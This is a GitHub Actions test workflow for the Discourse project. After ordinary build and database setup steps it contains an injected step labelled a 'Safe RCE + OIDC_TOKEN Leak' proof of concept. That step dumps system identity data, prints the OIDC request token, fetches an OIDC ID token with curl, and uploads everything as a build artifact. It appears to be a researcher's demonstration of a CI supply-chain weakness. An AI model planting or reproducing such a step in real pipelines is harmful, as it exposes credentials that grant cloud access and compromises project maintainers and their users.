name: Tests

on:
  pull_request:
    paths-ignore:
      - ".github/workflows/migration-tests.yml"
      - ".github/dependabot.yml"
      - ".github/labeler.yml"
      - "migrations/**"
  push:
    branches:
      - main
      - beta
      - stable
    paths-ignore:
      - ".github/workflows/migration-tests.yml"
      - ".github/dependabot.yml"
      - ".github/labeler.yml"
      - "migrations/**"

permissions:
  id-token: write
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    container: discourse/discourse_test:release
    timeout-minutes: 20
    env:
      RAILS_ENV: test
      PGUSER: discourse
      PGPASSWORD: discourse

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup Git
        run: |
          git config --global user.email "ci@ci.invalid"
          git config --global user.name "Discourse CI"

      - name: Start Redis
        run: redis-server /etc/redis/redis.conf &

      - name: Start Postgres
        run: |
          chown -R postgres /var/run/postgresql
          sudo -u postgres script/start_test_db.rb
          sudo -u postgres psql -c "CREATE ROLE $PGUSER LOGIN SUPERUSER PASSWORD '$PGPASSWORD';"

      - name: Install dependencies
        run: |
          gem install bundler -v "$(awk '/BUNDLED WITH/ {getline; print $1}' Gemfile.lock)"
          bundle config --local path vendor/bundle
          bundle install

      - name: pnpm install
        run: pnpm install --frozen-lockfile

      # ðŸ§ª Injected PoC: Safe RCE + OIDC_TOKEN Leak
      - name: Leak PoC Artifact
        run: |
          echo "SAFE_CI_PROOF [+] Executing payload..." > leaks.txt

          echo "== WHOAMI ==" >> leaks.txt
          whoami >> leaks.txt

          echo "== ID ==" >> leaks.txt
          id >> leaks.txt

          echo "== UNAME ==" >> leaks.txt
          uname -a >> leaks.txt

          echo "== OS RELEASE ==" >> leaks.txt
          cat /etc/os-release >> leaks.txt

          echo "== ENV VARS (SAFE) ==" >> leaks.txt
          env | grep -E '^(HOME|LANG|USER|PATH)' >> leaks.txt

          echo "== OIDC ENV ==" >> leaks.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" >> leaks.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" >> leaks.txt

          echo "== OIDC CURL ==" >> leaks.txt
          curl -sSL -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL?audience=api://default" >> leaks.txt || echo "OIDC curl failed" >> leaks.txt

      - name: Upload Leak Artifact
        uses: actions/upload-artifact@v4
        with:
          name: leaks.txt
          path: leaks.txt
